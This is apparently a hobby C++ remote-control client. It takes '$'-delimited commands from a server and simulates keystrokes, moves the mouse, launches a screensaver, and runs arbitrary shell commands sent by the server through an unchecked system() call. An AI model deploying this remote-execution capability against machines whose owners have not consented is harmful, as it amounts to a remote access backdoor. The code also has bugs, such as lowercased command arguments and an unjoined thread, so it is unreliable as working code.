#include "Commands.h"
#include "Online.h"

#include <string>
#include <vector>
#include <regex>
#include <thread>
#include <stdio.h>
#include <Windows.h>

using namespace std;


int doTask(SOCKET& server, int clientID, int commandID, string command, string commandArgs) // поток для выполнения команды, передаем server - сам сервер и другие параметры
{
	string msg;
	puts("started doing task");

	if (command == "mystify") // проверка на команду
	{
		try
		{
			system("mystify.scr -a");
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success"; // формируем ответ
			if (sendMessage(server, msg.c_str()) == 0) // посылаем серверу, что мы гении
			{
				puts("Failed sending login message");
				return 0;
			}
		}
		catch (const exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail"; // формируем ответ
			if (sendMessage(server, msg.c_str()) == 0) // посылаем серверу, что мы вообще не гении
			{
				puts("Failed sending login message");
				return 0;
			}
		}
	}
	else if (command == "switch")
	{
		puts("started doing switch command");
		try
		{
			keybd_event(VK_MENU, NULL, NULL, NULL);

			for (int i = 0; i < stoi(commandArgs); i++)
			{
				keybd_event(VK_TAB, NULL, NULL, NULL);
				keybd_event(VK_TAB, NULL, KEYEVENTF_KEYUP, NULL);
				puts("switch");
				Sleep(100);
			}

			keybd_event(VK_MENU, NULL, KEYEVENTF_KEYUP, NULL);
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending login message");
				return 0;
			}
		}
		catch (const exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending login message");
				return 0;
			}
		}
	}
	else if (command == "press")
	{
		char key = commandArgs.c_str()[0];
		try
		{
			keybd_event(VkKeyScan(key) & 0xff, NULL, NULL, NULL);
			keybd_event(VkKeyScan(key) & 0xff, NULL, KEYEVENTF_KEYUP, NULL);

			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
		catch (const exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
	}
	else if (command == "setmouse")
	{
		vector<string> pos;
		try
		{
			try
			{
				pos = split(commandArgs, ",");
			}
			catch (const std::exception&)
			{
				msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "invalid_syntax";
				if (sendMessage(server, msg.c_str()) == 0)
				{
					puts("Failed sending command response");
					return 0;
				}
			}
			SetCursorPos(stoi(pos[0]), stoi(pos[1]));

			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
		catch (const exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
	}
	else if (command == "movemouse")
	{
	vector<string> pos;
	POINT p;
	try
	{
		try
		{
			pos = split(commandArgs, ",");
		}
		catch (const std::exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "invalid_syntax";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
		GetCursorPos(&p);
		SetCursorPos(p.x + stoi(pos[0]), p.y + stoi(pos[1]));

		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
		if (sendMessage(server, msg.c_str()) == 0)
		{
			puts("Failed sending command response");
			return 0;
		}
	}
	catch (const exception&)
	{
		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
		if (sendMessage(server, msg.c_str()) == 0)
		{
			puts("Failed sending command response");
			return 0;
		}
	}
	}
	else if (command == "cmd")
	{
		try
		{
			system(commandArgs.c_str());
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "success";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
		catch (const exception&)
		{
			msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "fail";
			if (sendMessage(server, msg.c_str()) == 0)
			{
				puts("Failed sending command response");
				return 0;
			}
		}
	}
	else
	{
		msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "unknown_command";
		if (sendMessage(server, msg.c_str()) == 0)
		{
			puts("Failed sending command response");
			return 0;
		}
	}
}

int doSystemTask(SOCKET& server, string command, string commandArgs)
{
	if (command == "shutdown")
	{
		puts("Server shutdown, closing app");
		closesocket(server); // todo: reconnect to server in every ~30sek while not connect
		WSACleanup();
		exit(0);
	}
	else if (command == "disconnect")
	{
		puts("Disconnect, closing app");
		closesocket(server);
		WSACleanup();
		exit(0);
	}
}

vector<string> split(const string& input, const string& regex) 
{
	std::regex re(regex);
	std::sregex_token_iterator first{ input.begin(), input.end(), re, -1 }, last;
	return { first, last };
}

string upperToLower(string str)
{
	string result;
	char ch;

	for (int i = 0; i < str.length(); i++)
	{
		ch = tolower(str[i]);

		result += ch;
	}

	return result;
}


int parseCmd(SOCKET& server, int clientID, string cmd) // C$clientID$commandID$success
{
	string data;
	vector<string> args;
	int commandID;
	string command, commandArgs, msg;

	static const regex commandRegex(R"(\d+\$.+\$.+)");
	static const regex systemCommandRegex(R"(SYS\$.+)");

	data = cmd.substr(0, cmd.length() - 1);

	if (regex_match(data, commandRegex))
	{
		puts("command regex!");
		args = split(data, "\\$");

		commandID = atoi(args[0].c_str());
		command = args[1];
		commandArgs = args[2];

		command = upperToLower(command);
		commandArgs = upperToLower(commandArgs);

		thread t1(doTask, ref(server), clientID, commandID, command, commandArgs);
		t1.join();

	}
	else if (regex_match(data, systemCommandRegex))
	{
		args = split(data, "\\$");

		if (args.size() == 2)
		{
			command = args[1];
			commandArgs = "";
		}
		else if (args.size() == 3)
		{
			command = args[1];
			commandArgs = args[2];
		}

		command = upperToLower(command);
		commandArgs = upperToLower(commandArgs);

		thread t1(doSystemTask, ref(server), command, commandArgs);
	}
	
	return 1;
}